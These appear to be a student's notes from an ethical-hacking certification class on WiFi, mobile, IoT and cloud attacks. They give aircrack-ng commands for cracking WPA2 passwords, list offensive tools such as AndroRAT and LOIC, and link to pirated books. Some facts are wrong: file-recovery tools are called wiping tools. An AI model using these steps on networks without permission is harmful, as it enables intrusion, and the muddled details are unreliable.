
# CEHv13 Class 10 Notes

# Hacking Mobile Platforms, IoT and OT Hacking, and Cloud Computing

## WIFI Hacking

**Tools:** Kali Linux or Parrot OS

- Pass the Hash Attacks
- Collect Hash and Crack Hash
- Tools: airmon-ng, airodump-ng, aircrack-ng

### Steps:

1. **Identify the Wireless Network**
   ```bash
   iwconfig
   ```
   Interface: `wlan0`

2. **Convert Managed Mode -> Monitor Mode**
   ```bash
   airmon-ng start wlan0
   ```
   Result: `wlan0mon`

3. **Capture All Available Networks**
   ```bash
   airodump-ng wlan0mon
   ```

4. **Capture PPSR (Network Traffic)**
   ```bash
   airodump-ng -d <BSSID> -c1 -w wifihack wlan0mon
   ```

5. **Crack the Password**
   ```bash
   aircrack-ng -a2 -b <BSSID> -w <Password list> wifihack.pcap
   ```

### Protection Tips

- MAC Filtering
- Strong Encryption (WPA3, AES)
- Strong Passwords

---

## Hacking Mobile Platforms

- Vishing (Voice)
- Smishing (SMS)
- Social Engineering
- Malware
- Vulnerabilities

### Attack Vectors

- Fake Apps
- Camfecting Attacks (Camera/Microphone)
- Bluebugging Attack (Bluetooth Control)

### OS Details

- **Android:** Linux Kernel, DalvikVM — *Rooting*
- **iOS (Cocoa):** *Jailbreaking*

### Tools

- Phonesploit Pro
- AndroRAT
- Metasploit

### Protection Tips

1. Update Apps
2. Install from Trusted Sources
3. Avoid Unknown WiFi
4. Data Wiping Tools:
   - [Recuva](https://www.ccleaner.com/recuva)
   - [EaseUS](https://www.easeus.com/datarecoverywizardpro/)
   - Qphotorec
5. Disable GeoTagging
6. Limit HDR use

---

## IoT and OT Attacks

**IoT = Application + Hardware + Internet/Network**

### IoT OS Examples

- Windows 10 IoT
- Amazon FreeRTOS
- RIOT
- Ubuntu Core

**Device:** Raspberry Pi

### Network Protocols

- **Zigbee:** Wireless Communication
- **MQTT:** Message Queuing Telemetry Transport  
  - Port 1883 (Insecure)  
  - Port 8883 (Secure)

```bash
nmap -p 1883,8883 <IP>
```

Use [Shodan](https://www.shodan.io) for identifying exposed MQTT devices.

[Target Cyber Attack Case](https://www.sipa.columbia.edu/sipa-education/picker-center-executive-education/case-collection/target-cyber-attack)

---

## Cloud Computing

**Cloud Models:**

- IaaS: Infrastructure (e.g., AWS EC2, iLabs)
- PaaS: Platform (e.g., Azure, Salesforce)
- SaaS: Software (e.g., Google Docs, Office 365)
- SECaaS: Security as a Service

### Threat Vectors

- Man in the Cloud (MITC)
- Lack of Visibility
- Cloud Service Misuse (Malware Hosting)
- Operational Security (RBAC)
- Supply Chain Attacks
- Network Security

### Tools

- lazy scanner
- AADinternals
- Trivy

---

## Tools Covered

1. TOR
2. Psiphon
3. TMAC
4. Shodan
5. TheHarvester
6. Sherlock
7. Angry IP Scanner
8. nmap
9. Zenmap
10. hping3
11. snmp-check
12. NetBIOS Enumeration
13. AD Explorer
14. Nessus
15. OpenVAS
16. Responder
17. John the Ripper
18. L0phtCrack
19. Metasploit
20. Armitage
21. Wireshark
22. HOIC
23. LOIC
24. Bettercap
25. Ettercap (Graphical)
26. Hydra
27. Burpsuite
28. sqlmap
29. XSS Exploits
30. aircrack-ng
31. airmon-ng
32. AndroRAT
33. TCPview
34. Process Explorer
35. Autoruns
36. VirusTotal
37. IBM X-Force

Useful URLs:
- [urlscan.io](https://urlscan.io/)
- [any.run Malware Trends](https://any.run/malware-trends/)
- [libgen CEH Books](https://libgen.is/search.php?&req=ceh&phrase=1&view=simple&column=def&sort=year&sortmode=DESC)